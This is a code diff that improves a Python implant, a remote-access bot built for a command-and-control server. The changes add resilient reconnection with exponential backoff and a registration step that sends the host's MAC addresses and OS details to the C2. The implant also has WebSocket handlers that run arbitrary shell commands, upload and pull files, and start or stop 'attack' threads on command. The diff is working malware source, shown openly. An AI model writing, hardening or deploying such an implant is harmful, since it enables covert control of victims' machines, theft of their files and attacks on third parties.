@@ -1,6 +1,6 @@
 import asyncio
-import ctypes
 import json
+import shlex
 import subprocess
 import signal
 import sys
@@ -10,8 +10,11 @@ import socket
 import random
 import threading
 import time
+import re
+import platform
+import netifaces
 from websockets import connect
-from websockets.exceptions import ConnectionClosedError
+from websockets.exceptions import ConnectionClosedError, ConnectionClosedOK
 from typing import List, Dict, Tuple, Optional
 import requests
 
@@ -19,74 +22,118 @@ import requests
 
 class Impl:
     def __init__(self, c2_ws_url: str, group: str = "grupo"):
-        self.c2_ws_url = c2_ws_url
-        self.group = group
-        self.current_dir = os.getcwd()
-        self.upload_buffer = []
-        self.upload_destination = None
-        self.running = True
-        
-        self.attacks=[]
-        
-        
+            self.c2_ws_url = c2_ws_url
+            self.group = group
+            self.current_dir = os.getcwd()
+            self.upload_buffer = []
+            self.upload_destination = None
+            self.running = True
+            self.attack_thread = None
+            self.attacks = []
+            self.retry_count = 0
+            self.max_retry_delay = 300  
+
     async def run(self) -> None:
-       
-        await self.register()
+        
         while self.running:
             try:
+                
+                await self.register()
                 await self._connect_to_c2()
+                
+                self.retry_count = 0
+                
+            except ConnectionClosedOK:
+                await self._wait_before_retry()
+                
+            except (ConnectionClosedError, ConnectionRefusedError, TimeoutError) as e:
+                await self._wait_before_retry()
+                
             except Exception as e:
-                await asyncio.sleep(5)
+                await self._wait_before_retry()
+
+    async def _wait_before_retry(self):
+        self.retry_count += 1
+        
+        delay = min(5 * (2 ** (self.retry_count - 1)), self.max_retry_delay)
+        await asyncio.sleep(delay)
+
     
 
     async def _connect_to_c2(self) -> None:
-        async with connect(f"{self.c2_ws_url}?id={self.impl_id}") as ws:
-            while self.running:
-                await self._handle_commands(ws)
-    
+        try:
+            
+            async with connect(
+                f"ws://{self.c2_ws_url}/api/rcv?id={self.impl_id}",
+                ping_interval=20,
+                ping_timeout=10,
+                close_timeout=10,
+                open_timeout=30
+            ) as ws:
+                self.retry_count = 0  
+                
+                
+                while self.running:
+                    try:
+                        await self._handle_commands(ws)
+                    except ConnectionClosedError:
+                        raise
+                    except Exception as e:
+                        await asyncio.sleep(1)
+                        
+        except Exception as e:
+            raise
 
     async def _handle_commands(self, ws) -> None:
-       
         try:
-            cmd = await ws.recv()
-            data = json.loads(cmd.replace("'", '"'))
             
+            cmd = await asyncio.wait_for(ws.recv(), timeout=60)
+            data = json.loads(cmd)
+
             if 'cmd' in data:
                 await self._execute_command(ws, data['cmd'])
-
             elif 'chunk' in data:
                 await self._handle_file_upload(ws, data)
-
             elif 'list_files' in data:
                 await self._list_directory(ws, data.get('path', self.current_dir))
-
             elif 'get_files' in data:
-                path=data['get_files']
-                await self._send_file(ws, str(path))
-
+                await self._send_file(ws, data['get_files'])
             elif 'attack' in data:
                 await self._handle_attack_command(ws, data)
-
             elif 'stop_attack' in data:
-                await self._stop_attack(ws, data['stop_attack'])
+                await self._stop_attack(ws, attack_type=data['stop_attack'])
         
-        except ConnectionClosedError:
+        except asyncio.TimeoutError:
+            
             pass
+        except ConnectionClosedError:
+            raise
         except Exception as e:
-            await ws.send(json.dumps({"error": str(e)}))
-    
+            try:
+                await ws.send(json.dumps({"result": f"Error: {str(e)}"}))
+            except:
+                pass  
+
     async def _execute_command(self, ws, command: str) -> None:
-       
-        command = command.strip()
-        
         if command.startswith("cd "):
             await self._change_directory(ws, command[3:].strip())
+            return
+
         else:
-            out, err, cwd = self._execute_shell_command(command)
-            await ws.send(json.dumps({
-                "result": out if out else err,
-                "cwd": cwd
-            }))
+            out, err, _ = self._execute_shell_command(command)
+            output = out if out else err
+
+        if not isinstance(output, str):
+            output = str(output)
+            
+        output = output.replace("\r", "").rstrip()   
+        await ws.send(json.dumps({
+            "result": output,
+            "cwd": self.current_dir
+        }, ensure_ascii=False))
+
+
+
     
     async def _change_directory(self, ws, path: str) -> None:
        
@@ -465,7 +512,7 @@ class Impl:
 
 
     
-    async def register(self) -> None:
+    async def register(self) -> bool:
        
         model = {
             'impl_mac': self._get_macs(),
@@ -475,8 +522,26 @@ class Impl:
             'operating_system': self._get_operating_system(),
             'impl_id': self.impl_id
         }
+
+        req = requests.post(f"http://{self.c2_ws_url}/api/impl/new/{model['impl_id']}",  data=model, timeout=10)
+
+
+        max_attempts = 3
+
+        for attempt in range(max_attempts):
+            if attempt < max_attempts - 1:
+                await asyncio.sleep(3)
+            try:
+                req = requests.post(f"http://{self.c2_ws_url}/api/impl/new/{model['impl_id']}",  data=model, timeout=10)
+
+                if req.status_code == 200:
+                    return True
+                else:
+                    return False
+            except Exception as e:
+                return False 
         
-        req = requests.post(f"http://localhost:4444/api/impl/new/{model['impl_id']}", data=model)
+        return False
         
 
     @property
@@ -512,14 +577,26 @@ class Impl:
     
 
 
+
 if __name__ == "__main__":
+
+    C2_WS_URL = "localhost:4444"
+    GROUP_NAME = "grupo"
+    
+    
+    impl = Impl(c2_ws_url=C2_WS_URL, group=GROUP_NAME)
+    
+    def signal_handler(sig, frame):
+        impl.running = False
+        sys.exit(0)
+
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+
     try:
-        
-        C2_WS_URL = "ws://localhost:4444/api/rcv"
-        GROUP_NAME = "grupo"
-        
-        impl = Impl(c2_ws_url=C2_WS_URL, group=GROUP_NAME)
         asyncio.run(impl.run())
+    except KeyboardInterrupt:
+
+        impl.running = False
     except Exception as e:
-        next
-        
+        raise       
